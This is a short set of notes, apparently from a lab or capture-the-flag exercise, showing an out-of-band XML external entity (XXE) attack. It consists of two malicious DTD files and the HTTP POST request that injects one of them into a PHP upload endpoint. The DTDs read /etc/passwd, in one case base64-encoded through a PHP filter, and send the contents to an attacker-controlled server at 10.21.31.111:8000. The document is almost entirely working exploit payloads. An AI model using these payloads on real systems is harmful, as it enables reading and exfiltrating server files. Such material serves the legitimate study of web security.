
Local file "/web/xxe-get-etc-passwd.dtd" shared with python http server:
```dtd
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://10.21.31.111:8000/?data=%cmd;'>">
%oobxxe;
```

Request:
```http
POST /submit.php HTTP/1.1
Host: 10.10.145.74
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
X-Requested-With: XMLHttpRequest
Content-Length: 158
Origin: http://10.10.145.74
Connection: keep-alive
Referer: http://10.10.145.74/index.php
DNT: 1
Sec-GPC: 1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://10.21.31.111:8000/web/xxe-get-etc-passwd.dtd" >
<upload>
	<file>
		&exfil;
	</file>
</upload>
```

Other dtd example without php filter, just the file:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://10.21.31.111:8000/?data=%file;'>">
%oobxxe;
```
